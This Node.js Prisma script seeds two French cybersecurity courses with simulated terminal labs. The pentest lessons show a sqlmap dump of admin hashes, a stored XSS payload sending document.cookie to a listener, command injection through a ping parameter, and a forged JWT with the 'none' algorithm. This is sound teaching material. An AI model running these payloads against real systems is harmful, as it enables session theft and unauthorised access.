require('dotenv').config()
const { PrismaClient } = require('@prisma/client')
const prisma = new PrismaClient()

async function main() {
    console.log('🚀 Correction des backslashes JSON dans TOUTES les leçons de Cybersécurité...')

    // =========================================================================
    // FORMATION 1 : Defensive Security & SOC
    // =========================================================================
    const slug1 = 'cybersecurite-protection-systemes-defensive'
    const course1 = await prisma.course.findUnique({ where: { slug: slug1 } })

    if (course1) {
        console.log(`\n📦 Mise à jour de la formation 1 : "${course1.title}" (8 leçons)...`)

        // Leçon 1
        await prisma.lesson.updateMany({
            where: { courseId: course1.id, order: 1 },
            data: {
                content: `# Leçon 1 : Fondations de la Cybersécurité, Triade CIA & Cadres Règlementaires

## 1. La Triade CIA (Confidentialité, Intégrité, Disponibilité)

Tout système d'information sécurisé s'appuie sur trois piliers fondamentaux :
- **Confidentialité** : S'assurer que les données ne sont accessibles qu'aux utilisateurs autorisés (Chiffrement AES-256).
- **Intégrité** : Garantir que les données et configurations n'ont pas été altérées (Hashes SHA-256).
- **Disponibilité** : Garantir l'accès continu aux services pour les utilisateurs légitimes (Haute disponibilité, Anti-DDoS).

---

## 🖥️ Labo Interactif : Vérification d'Intégrité de Fichiers sous Windows PowerShell

\`\`\`cyberterminal
{
  "title": "Labo 1.1 — Inspection d'Intégrité SHA-256 (Windows PowerShell)",
  "os": "powershell",
  "steps": [
    {
      "command": "Get-ComputerInfo | Select-Object WindowsProductName, OsVersion, CsName",
      "output": "WindowsProductName : Windows 11 Pro\\nOsVersion          : 10.0.22631\\nCsName             : ELSAYF-SEC-SRV",
      "explanation": "Collecte des métadonnées du système d'exploitation Windows."
    },
    {
      "command": "Get-FileHash -Algorithm SHA256 C:\\\\Windows\\\\System32\\\\cmd.exe",
      "output": "Algorithm : SHA256\\nHash      : 660A900A9F9E2A895A231C925A1A8D49E8C76D229EBB05E857C12F21950A9467\\nPath      : C:\\\\Windows\\\\System32\\\\cmd.exe",
      "explanation": "Calcul de l'empreinte numérique SHA-256 pour vérifier l'intégrité du binaire CMD."
    },
    {
      "command": "Get-Service WinDefend, sshd | Select-Object Name, Status, StartType",
      "output": "Name       Status  StartType\\n----       ------  ---------\\nWinDefend  Running Automatic\\nsshd       Running Automatic",
      "explanation": "Vérification de la disponibilité des services critiques de défense."
    }
  ]
}
\`\`\`

---

## 2. Cadres de Référence et Normes Internationales
- **ISO/IEC 27001** : Norme internationale du SMSI.
- **NIST CSF** : *Identify, Protect, Detect, Respond, Recover*.`
            }
        })

        // Leçon 2
        await prisma.lesson.updateMany({
            where: { courseId: course1.id, order: 2 },
            data: {
                content: `# Leçon 2 : Hardening Windows Server & Sécurisation des Accès

## 1. Sécurisation du Pare-feu Windows Defender

Le pare-feu intégré de Windows permet de contrôler le trafic entrant et sortant pour chaque profil réseau (Domaine, Privé, Public).

---

## 🖥️ Labo Interactif : Configuration du Pare-feu Windows via PowerShell

\`\`\`cyberterminal
{
  "title": "Labo 2.1 — Hardening Pare-feu Windows & Fermeture des Ports Sensibles",
  "os": "powershell",
  "steps": [
    {
      "command": "Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True",
      "output": "SUCCESS: Tous les profils du pare-feu Windows Defender sont activés.",
      "explanation": "Activation globale du pare-feu sur tous les profils réseaux du serveur."
    },
    {
      "command": "New-NetFirewallRule -DisplayName 'Block-SMB-Inbound' -Direction Inbound -LocalPort 445 -Protocol TCP -Action Block",
      "output": "Name                  : Block-SMB-Inbound\\nDisplayName           : Block-SMB-Inbound\\nEnabled               : True\\nDirection             : Inbound\\nAction                : Block",
      "explanation": "Création d'une règle de blocage du port SMB 445 pour prévenir les ransomwares (type WannaCry)."
    },
    {
      "command": "Get-NetFirewallRule -DisplayName 'Block-SMB-Inbound'",
      "output": "Règle active: Blocage Inbound TCP 445 appliqué avec succès.",
      "explanation": "Vérification de l'application effective de la règle de sécurité."
    }
  ]
}
\`\`\`

---

## 2. Restriction des Droits & Stratégies de Groupes (GPO)
Utilisation du principe de moindre privilège et blocage des exécutions non autorisées via AppLocker.`
            }
        })

        // Leçon 3
        await prisma.lesson.updateMany({
            where: { courseId: course1.id, order: 3 },
            data: {
                content: `# Leçon 3 : Cryptographie Appliquée, PKI & Certificats sous Windows

## 1. Gestion des Certificats sous Windows

Windows possède son propre magasin de certificats centralisé (\`Cert:\`) accessible depuis PowerShell.

---

## 🖥️ Labo Interactif : Génération de Certificat SSL/TLS OpenSSL sous Windows CMD

\`\`\`cyberterminal
{
  "title": "Labo 3.1 — Génération de Certificat SSL avec OpenSSL sous Windows CMD",
  "os": "windows",
  "steps": [
    {
      "command": "openssl genrsa -out server.key 2048",
      "output": "Generating RSA private key, 2048 bit long modulus\\ne is 65537 (0x10001)\\nSUCCESS: Clé privée server.key générée.",
      "explanation": "Génération de la clé privée RSA 2048 bits sous Windows."
    },
    {
      "command": "openssl req -new -key server.key -out server.csr -subj '/C=DZ/ST=Alger/L=Alger/O=ElSayf/CN=secure.elsayf.click'",
      "output": "SUCCESS: Demande CSR générée pour secure.elsayf.click",
      "explanation": "Création du CSR (Certificate Signing Request)."
    },
    {
      "command": "certutil -dump server.key",
      "output": "Algorithm: RSA 2048 bits\\nKeySpec: AT_KEYEXCHANGE\\nPublic Key Hash: 9f8a7b6c5d4e3f2a1b0c9d8e7f6a5b4c",
      "explanation": "Vérification des propriétés de la clé via l'outil système CertUtil de Windows."
    }
  ]
}
\`\`\`

---

## 2. Chiffrement de Disque BitLocker
BitLocker chiffre l'intégralité du volume système pour protéger les données au repos.`
            }
        })

        // Leçon 4
        await prisma.lesson.updateMany({
            where: { courseId: course1.id, order: 4 },
            data: {
                content: `# Leçon 4 : Gestion des Identités (IAM), MFA & Audit Active Directory

## 1. Sécurité Active Directory & Comptes Utilisateurs

Active Directory (AD) est le cœur de la gestion des identités en entreprise.

---

## 🖥️ Labo Interactif : Administration & Audit d'Accès PowerShell

\`\`\`cyberterminal
{
  "title": "Labo 4.1 — Audit des Comptes Utilisateurs & Génération TOTP (PowerShell)",
  "os": "powershell",
  "steps": [
    {
      "command": "Get-LocalUser | Select-Object Name, Enabled, LastLogin",
      "output": "Name          Enabled LastLogin\\n----          ------- ---------\\nAdministrator False   2026-07-20 10:15:00\\nGuest         False   Never\\nSecAdmin      True    2026-07-26 21:30:12",
      "explanation": "Audit des comptes locaux Windows : Le compte Administrator par défaut est désactivé (Bonne pratique)."
    },
    {
      "command": "python -c \\"import pyotp; totp = pyotp.TOTP('JBSWY3DPEHPK3PXP'); print('Code 2FA Temporel:', totp.now())\\"",
      "output": "Code 2FA Temporel: 849204\\nValidité: 30 secondes",
      "explanation": "Génération d'un code TOTP à double facteur (2FA) avec Python."
    }
  ]
}
\`\`\`

---

## 2. Authentification Forte & Principes RBAC
Configuration de l'authentification multi-facteurs (MFA) et de la gestion par rôles.`
            }
        })

        // Leçon 5
        await prisma.lesson.updateMany({
            where: { courseId: course1.id, order: 5 },
            data: {
                content: `# Leçon 5 : Monitoring de Sécurité & Event Viewer Windows

## 1. Analyse des Journaux d'Événements Windows (Event Logs)

Windows enregistre chaque événement de sécurité sous des IDs spécifiques (ex: ID 4625 = Échec de connexion).

---

## 🖥️ Labo Interactif : Audit des Journaux d'Événements de Sécurité

\`\`\`cyberterminal
{
  "title": "Labo 5.1 — Détection de Tentatives de Connexion Suspectes (PowerShell)",
  "os": "powershell",
  "steps": [
    {
      "command": "Get-WinEvent -FilterHashtable @{LogName='Security';ID=4625} -MaxEvents 3",
      "output": "TimeCreated          ID Message\\n-----------          -- ------\\n2026-07-26 22:14:02 4625 An account failed to log on. Account: admin, Source IP: 185.220.101.4\\n2026-07-26 22:14:00 4625 An account failed to log on. Account: root, Source IP: 185.220.101.4",
      "explanation": "Extraction des événements ID 4625 (Tentatives de connexion échouées = Attaque Brute-Force)."
    },
    {
      "command": "Get-Service -Name *Wazuh*",
      "output": "Status   Name                DisplayName\\n------   ----                 -----------\\nRunning  WazuhSvc             Wazuh Agent",
      "explanation": "Vérification du statut du service de l'agent SIEM Wazuh sous Windows."
    }
  ]
}
\`\`\`

---

## 2. Déploiement d'un SIEM Centralisé
Centralisation et corrélation des événements pour le Security Operations Center (SOC).`
            }
        })

        // Leçon 6
        await prisma.lesson.updateMany({
            where: { courseId: course1.id, order: 6 },
            data: {
                content: `# Leçon 6 : Détection d'Intrusions IDS/IPS Suricata sous Windows

## 1. Fonctionnement d'un IDS/IPS

Un **IDS** inspecte le trafic réseau et alerte, tandis qu'un **IPS** bloque immédiatement les paquets suspectés.

---

## 🖥️ Labo Interactif : Blocage de Trafic Malveillant sous Invite CMD Windows

\`\`\`cyberterminal
{
  "title": "Labo 6.1 — Blocage Réseau via Netsh CMD sous Windows",
  "os": "windows",
  "steps": [
    {
      "command": "netsh advfirewall show allprofiles state",
      "output": "Domain Profile Settings:\\nState                                 ON\\nPrivate Profile Settings:\\nState                                 ON\\nPublic Profile Settings:\\nState                                 ON",
      "explanation": "Vérification du fonctionnement du pare-feu sur toutes les interfaces."
    },
    {
      "command": "netsh advfirewall firewall add rule name='SOC-Block-Attacker' dir=in action=block remoteip=198.51.100.42",
      "output": "Ok.\\nSUCCESS: Règle de blocage réseau ajoutée pour l'IP 198.51.100.42.",
      "explanation": "Blocage immédiat de l'adresse IP malveillante détectée par l'IDS."
    }
  ]
}
\`\`\`

---

## 2. Écriture de Règles Suricata Personnalisées
Détection de signatures de scans de ports et de requêtes malveillantes.`
            }
        })

        // Leçon 7
        await prisma.lesson.updateMany({
            where: { courseId: course1.id, order: 7 },
            data: {
                content: `# Leçon 7 : Incident Response, Digital Forensics & YARA Rules sous Windows

## 1. Recherche de Menaces & Forensics RAM/Disque

Détection d'artefacts d'attaques et analyse de processus suspectés.

---

## 🖥️ Labo Interactif : Scan YARA & Inspection de Processus Suspects (PowerShell)

\`\`\`cyberterminal
{
  "title": "Labo 7.1 — Analyse YARA & Connexions Suspectes under Windows",
  "os": "powershell",
  "steps": [
    {
      "command": "yara64.exe -r webshell_rules.yar C:\\\\inetpub\\\\wwwroot\\\\",
      "output": "[MATCH] Detect_PHP_Webshell C:\\\\inetpub\\\\wwwroot\\\\uploads\\\\cmd.php\\nALERTE FORENSICS: Webshell malveillant détecté dans /uploads/cmd.php !",
      "explanation": "Exécution d'un scan YARA sur le serveur web IIS : Détection d'un webshell PHP."
    },
    {
      "command": "Get-NetTCPConnection -State Established | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, OwningProcess",
      "output": "LocalAddress LocalPort RemoteAddress RemotePort OwningProcess\\n------------ --------- ------------- ---------- -------------\\n192.168.1.50 445       185.220.101.4 54321      4128",
      "explanation": "Identification du processus PID 4128 maintenant une connexion établie vers l'extérieur."
    }
  ]
}
\`\`\`

---

## 2. Analyse de Malware & Rapport d'Incident NIST
Isolement du système compromis et élimination des portes dérobées.`
            }
        })

        // Leçon 8
        await prisma.lesson.updateMany({
            where: { courseId: course1.id, order: 8 },
            data: {
                content: `# Leçon 8 : Architecture Zero Trust, Docker Security & Projet Final

## 1. Principes du Modèle Zero Trust ("Never Trust, Always Verify")

Aucun utilisateur ni conteneur n'est fait confiance par défaut.

---

## 🖥️ Labo Interactif : Hardening & Audit de Conteneur Docker (PowerShell)

\`\`\`cyberterminal
{
  "title": "Labo 8.1 — Sécurisation d'un Conteneur Docker sous Windows PowerShell",
  "os": "powershell",
  "steps": [
    {
      "command": "docker build -t elsayf-sec-app:v1 .",
      "output": "Step 1/5 : FROM node:20-alpine\\nStep 2/5 : USER appuser\\nSuccessfully built 8f7e6d5c4b3a\\nSuccessfully tagged elsayf-sec-app:v1",
      "explanation": "Build de l'image Docker configurée avec un utilisateur non-root restreint."
    },
    {
      "command": "docker run -d --name secure-prod --read-only --cap-drop=ALL elsayf-sec-app:v1",
      "output": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855\\nConteneur démarré en système de fichier Lecture Seule (Read-Only).",
      "explanation": "Lancement du conteneur en mode verrouillé (Read-Only filesystem + suppression des privilèges Linux)."
    }
  ]
}
\`\`\`

---

## 🏆 Projet Final : Rapport de Sécurité Défensive SOC
Mise en place intégrale du système de protection et d'audit.`
            }
        })

        console.log('✅ Formation 1 mise à jour avec 8 CyberTerminaux Windows !')
    }

    // =========================================================================
    // FORMATION 2 : Ethical Hacking & Pentest Web
    // =========================================================================
    const slug2 = 'ethical-hacking-securite-web-pentest'
    const course2 = await prisma.course.findUnique({ where: { slug: slug2 } })

    if (course2) {
        console.log(`\n📦 Mise à jour de la formation 2 : "${course2.title}" (8 leçons)...`)

        // Leçon 1
        await prisma.lesson.updateMany({
            where: { courseId: course2.id, order: 1 },
            data: {
                content: `# Leçon 1 : Fondations du Pentesting Éthique & Méthodologie PTES

## 1. Cadres Légaux et Déontologie de l'Ethical Hacking

Le test de pénétration éthique (Pentest) nécessite impérativement une **Autorisation Écrite (Ordre de Mission)**.

---

## 🖥️ Labo Interactif : Vérification du Réseau Cible (CMD Windows)

\`\`\`cyberterminal
{
  "title": "Labo 1.1 — Diagnostic Réseau & Accessibilité Cible (CMD Windows)",
  "os": "windows",
  "steps": [
    {
      "command": "ping 192.168.1.50",
      "output": "Pinging 192.168.1.50 with 32 bytes of data:\\nReply from 192.168.1.50: bytes=32 time=1ms TTL=64\\nReply from 192.168.1.50: bytes=32 time=1ms TTL=64\\n\\nPing statistics for 192.168.1.50:\\n    Packets: Sent = 2, Received = 2, Lost = 0 (0% loss)",
      "explanation": "Test de joignabilité de la machine cible (TTL=64 indique un système d'exploitation Linux)."
    },
    {
      "command": "nslookup target.elsayf.local",
      "output": "Server:  UnKnown\\nAddress:  192.168.1.1\\n\\nName:    target.elsayf.local\\nAddress:  192.168.1.50",
      "explanation": "Résolution DNS du nom de domaine interne vers l'IP cible."
    }
  ]
}
\`\`\`

---

## 2. Les 7 Phases de la Méthodologie PTES
Pré-engagement, Reconnaissance, Modélisation, Analyse, Exploitation, Post-exploitation, Rapport.`
            }
        })

        // Leçon 2
        await prisma.lesson.updateMany({
            where: { courseId: course2.id, order: 2 },
            data: {
                content: `# Leçon 2 : Reconnaissance, Cartographie & Scanner de Réseau (Nmap, OSINT)

## 1. Reconnaissance Active & Cartographie Nmap

Découverte des services et répertoires cachés sur le serveur web.

---

## 🖥️ Labo Interactif : Audit Nmap & Gobuster sous Windows CMD

\`\`\`cyberterminal
{
  "title": "Labo 2.1 — Cartographie Réseau avec Nmap & Gobuster (CMD Windows)",
  "os": "windows",
  "steps": [
    {
      "command": "nmap.exe -sS -p 22,80,443,3306 192.168.1.50",
      "output": "Starting Nmap 7.94 ( https://nmap.org )\nNmap scan report for target.elsayf.local (192.168.1.50)\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n443/tcp  open  https\n3306/tcp open  mysql",
      "explanation": "Scan SYN rapide des ports stratégiques."
    },
    {
      "command": "gobuster.exe dir -u http://192.168.1.50/ -w common.txt -x php,html",
      "output": "/admin                (Status: 301)\n/config.php           (Status: 200)\n/db_backup.sql        (Status: 200) [Size: 145200]\nFinished",
      "explanation": "Fuzzing de répertoires web : Découverte critique d'un fichier de sauvegarde SQL (/db_backup.sql) !"
    }
  ]
}
\`\`\`

---

## 2. Fuzzing de Sous-domaines
Utilisation d'outils de fuzzing DNS pour trouver des serveurs de développement cachés.`
            }
        })

        // Leçon 3
        await prisma.lesson.updateMany({
            where: { courseId: course2.id, order: 3 },
            data: {
                content: `# Leçon 3 : OWASP Top 10 - SQL Injections (SQLi) & Bypass d'Auth

## 1. Exploitation de la Vulnérabilité SQL Injection

Extraction automatisée des données confidentielles de l'application web.

---

## 🖥️ Labo Interactif : Exploitation SQLi & Dump avec SQLMap (PowerShell)

\`\`\`cyberterminal
{
  "title": "Labo 3.1 — Détection & Dump de Base SQLMap (Windows PowerShell)",
  "os": "powershell",
  "steps": [
    {
      "command": "python sqlmap.py -u \\"http://target.elsayf.local/search.php?id=1\\" --batch --dbs",
      "output": "sqlmap identified the following injection point:\nParameter: id (GET)\n    Type: boolean-based blind / UNION query\navailable databases [3]:\n[*] information_schema\n[*] mysql\n[*] elsayf_db",
      "explanation": "Identification de la faille SQLi et découverte des bases de données."
    },
    {
      "command": "python sqlmap.py -u \\"http://target.elsayf.local/search.php?id=1\\" -D elsayf_db -T admin_users --dump",
      "output": "Table: admin_users\n[2 entries]\n| 1 | admin@elsayf.click | $2b$12$e8ZbJ2... |\n| 2 | super@statlabo.com | $2b$12$k9LpW1... |\nExtraction terminée !",
      "explanation": "Dump de la table des administrateurs et des hashes de mots de passe."
    }
  ]
}
\`\`\`

---

## 2. Correctif Sécurisé : Requêtes Préparées (PDO)`
            }
        })

        // Leçon 4
        await prisma.lesson.updateMany({
            where: { courseId: course2.id, order: 4 },
            data: {
                content: `# Leçon 4 : OWASP Top 10 - Cross-Site Scripting (XSS) & CSRF

## 1. Attaques XSS & Vol de Cookies

Injecter du code JavaScript pour intercepter les sessions d'utilisateurs.

---

## 🖥️ Labo Interactif : Test de Payloads XSS & Serveur de Capture (PowerShell)

\`\`\`cyberterminal
{
  "title": "Labo 4.1 — Simulation d'un Serveur d'Exfiltration XSS (PowerShell)",
  "os": "powershell",
  "steps": [
    {
      "command": "python -m http.server 8080",
      "output": "Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/)...",
      "explanation": "Lancement d'un serveur d'écoute local Python pour capturer les cookies exfiltrés."
    },
    {
      "command": "Invoke-WebRequest -Uri 'http://target.elsayf.local/comment.php' -Method POST -Body @{comment='<script>fetch(\\\"http://192.168.1.100:8080/?c=\\\"+document.cookie)</script>'}",
      "output": "StatusCode        : 200\\nStatusDescription : OK\\nCommentaire injecté avec succès !",
      "explanation": "Envoi d'un payload XSS Stored dans le champ commentaire de l'application."
    }
  ]
}
\`\`\`

---

## 2. Protection Content Security Policy (CSP)`
            }
        })

        // Leçon 5
        await prisma.lesson.updateMany({
            where: { courseId: course2.id, order: 5 },
            data: {
                content: `# Leçon 5 : OWASP Top 10 - Command Injection (RCE) & IDOR

## 1. Exécution de Commandes à Distance (RCE)

Exploiter les entrées utilisateurs non assainies passées à des fonctions système.

---

## 🖥️ Labo Interactif : Exploitation d'une Faille Command Injection (PowerShell)

\`\`\`cyberterminal
{
  "title": "Labo 5.1 — Injection de Commandes à Distance RCE (Windows PowerShell)",
  "os": "powershell",
  "steps": [
    {
      "command": "Invoke-RestMethod -Uri 'http://target.elsayf.local/ping.php?host=127.0.0.1%7Cwhoami'",
      "output": "nt authority\\\\system",
      "explanation": "Injection de la commande 'whoami' via le séparateur pipe (|) : Le serveur web s'exécute avec les privilèges NT AUTHORITY\\\\SYSTEM !"
    },
    {
      "command": "Invoke-RestMethod -Uri 'http://target.elsayf.local/ping.php?host=127.0.0.1%7Cdir%20C:\\\\Users\\\\Administrator'",
      "output": "Directory of C:\\\\Users\\\\Administrator\\n\\n2026-07-20  10:00    <DIR>          Desktop\\n2026-07-26  15:30            32     flag.txt",
      "explanation": "Exploration du dossier de l'Administrateur à distance via RCE."
    }
  ]
}
\`\`\`

---

## 2. Contrôle d'Accès IDOR (Insecure Direct Object Reference)`
            }
        })

        // Leçon 6
        await prisma.lesson.updateMany({
            where: { courseId: course2.id, order: 6 },
            data: {
                content: `# Leçon 6 : Auditing d'APIs REST & Tokens JWT avec Burp Suite & Python

## 1. Sécurité des Jetons JWT (JSON Web Tokens)

Auditer la résistance des tokens d'authentification face au bypass de signature.

---

## 🖥️ Labo Interactif : Décodage & Attaque 'None Algorithm' JWT (PowerShell)

\`\`\`cyberterminal
{
  "title": "Labo 6.1 — Audit & Manipulation de Tokens JWT (PowerShell)",
  "os": "powershell",
  "steps": [
    {
      "command": "python -c \\"import jwt; print(jwt.decode('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoic3R1ZGVudCIsInJvbGUiOiJTVFVERU5UIn0.xyz', options={'verify_signature': False}))\\"",
      "output": "{'user': 'student', 'role': 'STUDENT'}",
      "explanation": "Décodage du payload d'un token JWT sans vérification de signature."
    },
    {
      "command": "Invoke-RestMethod -Uri 'http://target.elsayf.local/api/admin/stats' -Headers @{Authorization='Bearer eyJhbGciOiJOb25lIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiQURNSU4ifQ.'}",
      "output": "StatusCode : 200\\nResponse   : {'success': True, 'message': 'Bienvenue Super Admin !'}",
      "explanation": "Exploitation réussie de la faille 'Algorithm None' pour usurper le rôle ADMIN !"
    }
  ]
}
\`\`\`

---

## 2. Best Practices : Signature Obligatoire & Expiration Court Terme`
            }
        })

        // Leçon 7
        await prisma.lesson.updateMany({
            where: { courseId: course2.id, order: 7 },
            data: {
                content: `# Leçon 7 : Élévation de Privilèges (PrivEsc) & Scripting d'Exploits

## 1. Technologues d'Élévation de Privilèges Windows / Linux

Passer d'un compte utilisateur standard au rôle Administrateur ou Root.

---

## 🖥️ Labo Interactif : Inspection de Privilèges Windows (CMD Windows)

\`\`\`cyberterminal
{
  "title": "Labo 7.1 — Inspection des Privilèges Utilisateur (CMD Windows)",
  "os": "windows",
  "steps": [
    {
      "command": "whoami /priv",
      "output": "PRIVILEGES INFORMATION\\n----------------------\\nPrivilege Name                Description                          State   \\n============================= ==================================== ========\\nSeChangeNotifyPrivilege       Bypass traverse checking             Enabled \\nSeImpersonatePrivilege        Impersonate a client after auth      Enabled ",
      "explanation": "Audit des privilèges : Présence du privilège 'SeImpersonatePrivilege' permettant une élévation de privilèges via Potato exploits (JuicyPotato / PrintSpoofer)."
    },
    {
      "command": "cmd.exe /c \\"dir C:\\\\Windows\\\\Tasks\\\\\\"",
      "output": "2026-07-26  21:00    <DIR>          .\\n2026-07-26  21:00            104    backup_script.bat",
      "explanation": "Recherche de tâches planifiées vulnérables à une écriture de script."
    }
  ]
}
\`\`\`

---

## 2. Développement de Scripts Python d'Exploitation`
            }
        })

        // Leçon 8
        await prisma.lesson.updateMany({
            where: { courseId: course2.id, order: 8 },
            data: {
                content: `# Leçon 8 : Rédaction d'un Rapport d'Audit Professionnel & Recommandations

## 1. Structure d'un Rapport d'Audit de Sécurité Pentest

Un rapport de pentest professionnel comporte un résumé exécutif pour la direction et un détail technique pour les développeurs.

---

## 🖥️ Labo Interactif : Génération Automatisée du Rapport Pentest (PowerShell)

\`\`\`cyberterminal
{
  "title": "Labo 8.1 — Génération du Rapport d'Audit de Sécurité (PowerShell)",
  "os": "powershell",
  "steps": [
    {
      "command": "python generate_report.py --input audit_results.json --out Rapport_Pentest_ElSayf.pdf",
      "output": "[+] Lecture des vulnérabilités (1 Critical, 2 High, 3 Medium)...\\n[+] Génération des graphiques de risques OWASP...\\n✅ Rapport PDF généré avec succès : Rapport_Pentest_ElSayf.pdf",
      "explanation": "Compilation automatisée des résultats de l'audit en rapport officiel PDF."
    },
    {
      "command": "Get-Item Rapport_Pentest_ElSayf.pdf | Select-Object Name, Length, LastWriteTime",
      "output": "Name                      Length LastWriteTime\\n----                      ------ -------------\\nRapport_Pentest_ElSayf.pdf 245100 2026-07-26 22:45:00",
      "explanation": "Vérification de la création du document de restitution client."
    }
  ]
}
\`\`\`

---

## 🏆 Félicitations !
Vous avez complété avec succès la formation **Ethical Hacking & Pentest Web**.`
            }
        })

        console.log('✅ Formation 2 mise à jour avec 8 CyberTerminaux Windows !')
    }

    console.log('\n🎉 Les 16 leçons ont été corrigées avec des backslashes de sécurité propres !')
}

main()
    .catch(e => {
        console.error('❌ Erreur :', e)
        process.exit(1)
    })
    .finally(async () => {
        await prisma.$disconnect()
    })
